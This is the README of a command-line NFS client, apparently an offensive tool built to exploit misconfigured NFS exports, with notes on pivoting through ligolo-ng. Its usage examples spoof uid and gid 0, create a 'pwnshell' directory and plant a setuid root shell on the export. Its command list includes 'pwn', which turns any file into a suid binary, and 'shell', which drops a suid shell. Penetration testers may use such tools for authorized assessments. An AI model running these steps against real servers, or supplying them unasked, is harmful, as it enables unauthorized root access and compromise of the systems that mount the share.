Simple CLI for NFS.

Contains some commands that makes exploiting serious misconfigurations a bit quicker.

- Will not work with proxychains
- Works great with ligolo-ng
- Port forwarding should work fine, allows setting custom ports for portmapper/mountd/nfs

Based on native Go library <github.com/willscott/go-nfs-client>, so should work fine on Windows.

## Usage
Showmount:
```sh
nfs-cli --showmount nfs-server.corp.local
- /exports/home (192.168.0.0/255.255.0.0)
```

CLI:
```sh
nfs-cli --uid 0 --gid 0 nfs-server.corp.local /exports/home
(/exports/home) / >> mkdir pwnshell
(/exports/home) / >> cd pwnshell
(/exports/home) /pwnshell >> shell rootsh
(/exports/home) /pwnshell >> ls
06777 (-rwsrwsrwx )  0      0      148     2026-01-01T00:00:01+01:00  [rootsh]*
```

If extra arguments are provided, these will be parsed instead of reading from the CLI (EOF is expected):
```sh
nfs-cli nfs-server.corp.local /exports/home --uid 0 --gid 0 'mkdir pwnshell' 'cd pwnshell' 'shell rootsh' 'ls'
06777 (-rwsrwsrwx )  0      0      148     2026-01-01T00:00:01+01:00  [rootsh]*
2026/01/01 00:00:01 error: EOF
```

### Flags
```
  -d, --debug                 enable debugging
      --fh string             specify file handle in binary hex notation (will skip mountd interaction)
  -g, --gid int               group id (default 1000)
  -h, --help                  help for nfs-cli
  -m, --machine string        machine name (default "localhost")
      --mountd-port int       mountd port
      --nfs-port int          nfs port
      --portmapper-port int   portmapper port (default 111)
  -p, --privileged            use privileged port (usually requires root)
      --showmount             list exported filesystems and exit
      --timeout duration      timeout for nfs operations (default 10s)
  -u, --uid int               user id (default 1000)
```

### Available Commands
```
  attr        Displays some file information, similar to stat
  cat         Downloads a file to stdout
  cd          Change directory
  get         Download a file
  help        Help about any command
  lcd         Change local directory
  ln          Create a symlink
  ls          List files in directory
  mkdir       Create a directory
  mv          Renames a file
  put         Uploads a file (or from stdin)
  pwd         Print working directory
  pwn         Turn any file into a suid binary
  rm          Remove a file
  rmdir       Removes a directory
  setattr     Sets attributes for a file entry
  shell       Drop a suid shell
```

## Building
```sh
go build .

GOOS=windows go build .
```

Or static:
```sh
CGO_ENABLED=0 go build -a -trimpath -ldflags '-s -X main.version= -buildid= -extldflags "-static"' .
```
